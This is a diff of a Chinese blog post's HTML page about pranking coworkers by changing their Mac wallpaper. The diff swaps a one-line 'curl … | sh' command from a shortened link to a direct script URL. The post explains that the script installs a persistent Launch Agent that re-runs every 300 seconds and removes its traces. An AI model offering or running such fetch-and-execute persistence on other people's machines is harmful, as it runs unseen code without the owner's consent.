@@ -57,7 +57,7 @@
 或者是密码被改了 = =！
 
 其实是为了提醒同事要有安全意识，不过到后来，就演变出了一些套路……">
-<meta property="og:updated_time" content="2016-08-29T14:16:55.000Z">
+<meta property="og:updated_time" content="2016-09-05T08:21:22.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="偷换同事 Mac 壁纸">
 <meta name="twitter:description" content="我先讲个故事，在我们公司流行这么一个风气:
@@ -310,7 +310,7 @@
 <p>不过后来，她们也学会这个套路了，杀进程。一有新同事来，抓住机会就给你换上去。</p>
 <h3 id="Mac-下自动换壁纸"><a href="#Mac-下自动换壁纸" class="headerlink" title="Mac 下自动换壁纸"></a>Mac 下自动换壁纸</h3><p>公司新同事越来越多，用 Mac 的人也越来越多了。这个 exe 套路在 Mac 上行不通呀。于是我今天就整了一个脚本出来活跃气氛了。</p>
 <p>代码如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl http://t.cn/Rcvzqda | sh</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl http://blog.evalbug.com/uploads/osxdesktop.sh | sh</span><br></pre></td></tr></table></figure>
 <p>呐，就一条命令直接就能实现在 windows 下的效果了，收藏了给你同事用呀。</p>
 <h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>原理就是用 <code>Launch Daemon/Agent</code> 的机制来实现系统启动时自动执行脚本程序，具体可以看我这篇博客的介绍：<a href="http://blog.evalbug.com/2015/11/29/osx_plist_startup/">Mac OS X 开机启动脚本(自动构建 Bugscan 节点)</a></p>
 <p>调用了 osascript 来自动下载图片，设为壁纸，删除文件清理现场。</p>
@@ -321,7 +321,6 @@
 <p>每 300 秒执行一次脚本</p>
 </blockquote>
 <p>然后把整个脚本包装一下放到远端就是一开始看的那个：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl http://t.cn/Rcvzqda | sh</span><br></pre></td></tr></table></figure>
 <p>好吧，现在换壁纸就方便多了。2333.</p>
 </span>
       
